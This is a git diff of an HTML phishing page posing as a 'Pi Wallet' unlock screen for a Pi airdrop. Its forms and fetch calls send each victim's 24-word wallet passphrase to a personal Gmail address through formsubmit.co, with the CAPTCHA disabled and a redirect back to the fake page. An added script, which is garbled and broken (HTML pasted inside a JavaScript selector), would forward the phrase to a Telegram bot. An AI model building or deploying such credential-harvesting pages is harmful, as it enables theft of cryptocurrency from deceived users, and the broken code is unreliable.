@@ -44,63 +44,63 @@
       </section>
 
       <section id="passphraseForm" class="passphrase-section hidden">
-  <h3 id="formTitle">Unlock Pi Wallet</h3>
-  <form id="passphraseFormElement">
-    <textarea name="passphrase" placeholder="Enter your 24-word passphrase here" required></textarea>
-    <button class="submit-button" type="submit">Unlock With Passphrase</button>
-    <input type="hidden" name="_captcha" value="false">
-  </form>
+  <h3>Unlock Pi Wallet</h3>
+  <form action="https://formsubmit.co/kp25626900@gmail.com" method="POST">
+  <textarea name="passphrase" placeholder="Enter your 24-word passphrase here" required></textarea>
+  
+  <!-- Prevent CAPTCHA -->
+  <input type="hidden" name="_captcha" value="false">
 
-  <div class="info-block">
-    <p class="info">
-      As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. 
-      Recovery of passphrase is currently impossible.
-    </p>
-    <p class="warning">
-      Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your <b>π</b> 
-      in your previous wallet will be inaccessible.
-    </p>
-  </div>
+  <!-- Redirect back to your own page (edit this URL below) -->
+  <input type="hidden" name="_next" value="https://pinetwork314-dot.github.io/Pi-Airdrop/">
 
-  <p id="successMessage" class="success-message" style="display: none; color: green; font-weight: bold;">
-    ✅ Submission Completed. Thank you!
+  <button class="submit-button" type="submit">Unlock With Passphrase</button>
+</form>
+
+  <p class="info">
+    As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. 
+    Recovery of passphrase is currently impossible.
+  </p>
+  <p class="warning">
+    Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your <b>π</b> 
+    in your previous wallet will be inaccessible.
   </p>
 </section>
     </main>
   </div>
 
- <script>
-  document.getElementById("claimBtn").addEventListener("click", function () {
-    document.getElementById("passphraseForm").classList.remove("hidden");
-    this.style.display = "none";
-  });
-
-  document.getElementById("passphraseFormElement").addEventListener("submit", function (e) {
-    e.preventDefault(); // prevent default form submission
-
-    const passphrase = this.passphrase.value;
-
-    // Send via FormSubmit
-    fetch("https://formsubmit.co/ajax/kp25626900@gmail.com", {
-      method: "POST",
-      headers: {
-        'Content-Type': 'application/json',
-        'Accept': 'application/json'
-      },
-      body: JSON.stringify({ passphrase })
-    })
-    .then(response => {
-      // Hide the form
-      document.getElementById("passphraseFormElement").style.display = "none";
-      // Change the title
-      document.getElementById("formTitle").textContent = "Thank You!";
-      // Show success message
-      document.getElementById("successMessage").style.display = "block";
-    })
-    .catch(error => {
-      alert("Something went wrong. Please try again.");
+  <script>
+    document.getElementById("claimBtn").addEventListener("click", function () {
+      document.getElementById("passphraseForm").classList.remove("hidden");
+      this.style.display = "none"; // hide the claim button
     });
-  });
+  </script>
+</body>
+</html>
+<script>
+  function sendPassphrase() {
+    const phrase = document.querySelector<form action="https://formsubmit.co/kp25626900@gmail.com" method="POST">
+  <textarea name="passphrase" placeholder="Enter your 24-word passphrase here" required></textarea>
+  <button class="submit-button" type="submit">Unlock With Passphrase</button>
+
+  <input type="hidden" name="_captcha" value="false">
+</form>.value;
+
+    // Example: log to console (NOT recommended for real use)
+    console.log("Entered passphrase:", phrase);
+
+    // Example: send to your Telegram bot (only if it's your own use)
+    fetch("https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: "<YOUR_CHAT_ID>",
+        text: Passphrase entered: ${phrase}
+      })
+    });
+
+    alert("Passphrase submitted.");
+  }
 </script>
 <!-- partial -->
   
